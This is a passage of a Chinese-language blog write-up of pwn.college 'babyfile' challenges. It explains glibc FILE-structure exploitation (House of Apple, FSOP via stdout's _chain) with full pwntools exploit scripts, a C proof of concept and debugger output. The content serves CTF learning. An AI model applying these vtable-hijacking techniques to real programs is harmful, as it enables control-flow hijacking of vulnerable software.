0x0070 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0038 */</span>        _IO_iconv_t __cd_in;</span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0038 */</span>        _IO_iconv_t __cd_out;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):  112 */</span></span><br><span class="line">                               &#125; _codecvt;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0004 */</span>    <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x00e0      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  232 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>既然<code>_IO_FILE</code>本身就自带一个<code>vtable</code>,那么<code>level7</code>为何还要多此一举去改<code>_IO_FILE._wide_data._wide_vtable</code>?</p>
<p>因为<code>pwncollege</code>提供的靶场环境中使用的<code>libc</code>版本是<code>Ubuntu GLIBC 2.31-0ubuntu9.16</code></p>
<p>在<code>Glibc 2.23</code>之前是可以直接修改<code>_IO_FILE.vtable</code>指针的,
相关攻击方式被称为<code>house of orange</code>,</p>
<p>此攻击可以在<code>how2heap</code>靶场学习,<code>ubuntu16.04</code>有<code>Glibc2.23</code>环境</p>
<p>但<code>Glibc 2.24</code>之后就加入了对<code>_IO_FILE.vtable</code>指针的范围检查,只能在<code>glibc</code>内存区中的某个特定位置,不允许指向堆区或者栈区</p>
<p>但是<code>_IO_FILE._wide_data._wide_vtable</code>还是没有检查的,相关攻击方式被称为<code>house of apple</code></p>
<p>吃完<code>apple</code>回来,可以做level7题了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *          </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level7&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;/challenge/babyfile_level7&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#获取win函数地址,泄露puts地址,泄露libc基地址,泄露_IO_wfile_jumps地址</span></span><br><span class="line">win_addr = <span class="number">0x4012E6</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The name buffer is located at: &#x27;</span>)</span><br><span class="line">name_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(name_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_addr = &quot;</span>,<span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">vtable_addr = libc_addr + libc.dump(<span class="string">&quot;_IO_file_jumps&quot;</span>)</span><br><span class="line">wide_vtable_addr =libc_addr + libc.dump(<span class="string">&quot;_IO_wfile_jumps&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc @ %p&quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vtable = &quot;</span>,<span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wide_vtable = &quot;</span>,<span class="built_in">hex</span>(wide_vtable_addr))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1&amp;2 </span></span><br><span class="line"><span class="comment">#构造fake_wide_data和fake_wide_vtable,</span></span><br><span class="line"><span class="comment">#由于只有一个可用堆块,哥俩得穿一条裤子</span></span><br><span class="line">fake_wide_data_addr = name_addr</span><br><span class="line">fake_wide_vtable_addr = name_addr + <span class="number">0x80</span></span><br><span class="line">fake_wide_data  =p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">fake_wide_data += p64(fake_wide_vtable_addr)<span class="comment">#     const struct _IO_jump_t *_wide_vtable;</span></span><br><span class="line">fake_wide_data += p64(win_addr)</span><br><span class="line">p.send(fake_wide_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#设置FILE.flag</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>)</span><br><span class="line"><span class="comment">#不能有_IO_CURRENTLY_PUTTING</span></span><br><span class="line"><span class="comment">#可写,不能有_IO_NO_WRITES</span></span><br><span class="line"><span class="comment">#不能有_IO_UNBUFFERED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4&amp;5</span></span><br><span class="line"><span class="comment">#修改FILE.vtable指向_IO_wfile_jumps,</span></span><br><span class="line"><span class="comment">#修改FILE._wide_data指向fake_wide_data</span></span><br><span class="line"><span class="comment">#这里设置的flags是保证能进入某些分支</span></span><br><span class="line">fp.vtable = wide_vtable_addr</span><br><span class="line">fp._wide_data = name_addr</span><br><span class="line">payload = <span class="built_in">bytes</span>(fp)</span><br><span class="line"><span class="built_in">print</span>(fp)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level9">level9</h3>
<p><code>level9</code>中有一个函数<code>authenticated</code>可以<code>ret2text</code></p>
<p><code>level9</code>首先泄露的<code>puts</code>的地址</p>
<p><code>level9</code>给的利用点就是可以往<code>_IO_2_1_stdout_</code>结构体写入最多<code>0x1e0</code>个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,stdout,0x1e0)</span><br></pre></td></tr></table></figure>
<p>最初的想法是直接修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdout -&gt; vtable = _IO_wfile_jumps</span><br><span class="line">stdout -&gt; _wide_data -&gt; _wide_vtable -&gt; _IO_wfile_doallocate = authenticated </span><br></pre></td></tr></table></figure>
<p>这样在下次<code>puts</code>或者<code>printf</code>时就可以触发<code>authenticated</code>函数</p>
<p>然而很不幸</p>
<p><code>authenticated</code>中在使用<code>write(1,flag_buffer,flag_length)</code>打印flag之前,还有一个<code>puts("You win! Here is your flag:");</code>这会导致什么呢?</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>puts调用authenticated</p>
<p>authenticated调用puts</p>
<p>…</p>
<p>发生了递归调用的悲剧, 最终程序会因为爆栈内存导致段错误</p>
<p>原因是<code>puts</code>默认使用的就是<code>stdout</code>,而我们改的也正是<code>stdout</code></p>
<blockquote>
<p>可以通过这个poc调试观察这个悲剧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.stdout指向fp</span></span><br><span class="line">    <span class="built_in">stdout</span> = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.trigger</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在win上下断点发现win确实可以调用,但是win中的puts会递归调用到win</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#1  0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#2  0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#3  0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#4  __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#5  __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#6  0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#7  __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#8  0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#9  0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#10 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#11 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#12 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#13 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#14 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#15 0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#16 __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#17 0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#18 0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#19 0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#20 0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#21 0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#22 __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#23 __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>虽然上述poc验证了这个悲剧</p>
<p>但是这个poc也给我另一个想法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.stdout指向fp</span></span><br><span class="line"><span class="built_in">stdout</span> = fp;</span><br></pre></td></tr></table></figure>
<p>如果在这里我们保持stdout的完整性,只是改变其后继指针<code>_chain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//6.fp借助stdout上链</span><br><span class="line">stdout -&gt; _chain = fp;</span><br></pre></td></tr></table></figure>
<p>然后在程序退出时利用<code>FSOP</code>的机制, win就会被调用,
实验证明确实如此</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./stdout</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> @ 0x7f220bf40110</span><br><span class="line">_IO_wfile_jumps @ 0x7f220c0c1268</span><br><span class="line">hello</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一个<code>struct _IO_FILE_plus</code>大小是<code>0xe0 B</code>,两个就是<code>0x1c0 B</code></p>
<p>而<code>level9</code>允许我们写入<code>0x1e0 B</code>,能放开两个<code>struct _IO_FILE_plus</code>还能剩下<code>0x20 B</code>空间用于布置<code>wide_data</code>和<code>wide_vtable</code></p>
<p>溢出时<code>stdout</code>首当其冲, 我们需要保持其<code>flag</code>,
<code>vtable</code>不变 ,
并且给其<code>lock</code>找一个合适的地方(一个可写且值为0的地方)</p>
<p>接下来的溢出会毁坏<code>libc</code>中的一些数据,
但是不会影响到控制流, 狠狠搞坏它</p>
<p>画在图上意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241007211929871.png"
alt="stdout-&gt;_chain = fake_fp" />
<figcaption aria-hidden="true">stdout-&gt;_chain = fake_fp</figcaption>
</figure>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level9&quot;</span>)</span><br><span class="line"></span><br><span class="line">authenticated_addr = <span class="number">0x401866</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.泄露libc基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">stdout_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">_IO_file_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_file_jumps&#x27;</span>)</span><br><span class="line">_IO_wfile_jumps_addr = libc_base + libc.dump(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.fake_fp应该跟在stdout之后</span></span><br><span class="line">fake_fp_addr = stdout_addr + <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout @ &quot;</span>,<span class="built_in">hex</span>(stdout_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp @ &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fp_addr - stdout_addr = &quot;</span>,<span class="built_in">hex</span>(fake_fp_addr - stdout_addr))</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = fake_fp_addr + <span class="number">0xe0</span> - <span class="number">0xe0</span></span><br><span class="line">fake_IO_wdoallocbuf_addr = fake_fp_addr + <span class="number">0xe0</span> + <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_IO_wdoallocbuf_addr @ &quot;</span>,<span class="built_in">hex</span>(fake_IO_wdoallocbuf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造stdout_fp,保证其flags,fileno不变</span></span><br><span class="line"><span class="comment">#lock指向一个可写值为0的地方,比如fake_fp_addr-&gt;read_buf_ptr</span></span><br><span class="line"><span class="comment">#chain指向紧跟在后边的fake_fp</span></span><br><span class="line"><span class="comment">#vtable保持使用默认的_IO_file_jumps_addr</span></span><br><span class="line">fake_stdout_fp = FileStructure()</span><br><span class="line">fake_stdout_fp.flags = <span class="number">0xfbad2887</span></span><br><span class="line">fake_stdout_fp.fileno = <span class="number">1</span></span><br><span class="line">fake_stdout_fp.chain = fake_fp_addr</span><br><span class="line">fake_stdout_fp._lock = fake_fp_addr + <span class="number">0x8</span></span><br><span class="line">fake_stdout_fp.vtable = _IO_file_jumps_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.构造fake_fp,</span></span><br><span class="line"><span class="comment">#根据FSOP的条件构造其成员</span></span><br><span class="line">fake_fp = FileStructure()</span><br><span class="line">fake_fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">0x2</span>)</span><br><span class="line">fake_fp._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fake_fp._IO_write_end =<span class="number">0</span></span><br><span class="line">fake_fp._lock = fake_fp_addr + <span class="number">0x10</span></span><br><span class="line">fake_fp.vtable = _IO_wfile_jumps_addr</span><br><span class="line">fake_fp._wide_data = fake_wide_data_addr   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fake_stdout_fp)</span><br><span class="line"><span class="built_in">print</span>(fake_fp)</span><br><span class="line"></span><br><span class="line">payload =<span class="built_in">bytes</span>(fake_stdout_fp) + <span class="built_in">bytes</span>(fake_fp) + p64(fake_IO_wdoallocbuf_addr - <span class="number">0x68</span>) + p64(authenticated_addr) +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level10">level10</h3>
<p>相比于level8,多了一步</p>
<p>在调用wide_vtable函数时需要传递字符串参数</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/FILE-exploit/" rel="tag"># FILE exploit</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/05/21/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" rel="prev" title="kernel">
      <i class="fa fa-chevron-left"></i> kernel
    </a></div>
      <div class="post-nav-item">
